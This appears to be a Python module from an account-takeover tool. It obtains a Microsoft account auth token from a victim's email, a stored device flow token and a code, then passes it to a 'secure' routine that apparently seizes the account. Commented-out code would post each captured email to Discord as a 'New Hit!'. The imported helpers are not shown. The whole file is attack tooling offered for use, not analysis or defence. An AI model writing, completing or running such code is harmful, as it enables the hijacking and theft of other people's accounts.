from views.utils.getMSAAUTH import getMSAAUTH
from views.utils.secure import secure
from discord import Embed
import json

def startSecuringAccount(email: str, device: str = None, code: str = None):
    if not device:
        device = json.load(open("data.json", "r+"))["flowtoken"] 
        
    msaauth = getMSAAUTH(email, device, code)
    
    if msaauth is None:
        print("[-] - Failed to get MSAAUTH")
        return msaauth
    
    print("[+] - Got MSAAUTH | Starting to secure...")
    account = secure(msaauth)
    print(account)

    # embed = Embed(
    #     title = f"New Hit!"
    # )

    # embed.add_field(
    #     name = "Email: ", value = f"```{account[]}```"
    # )
    return account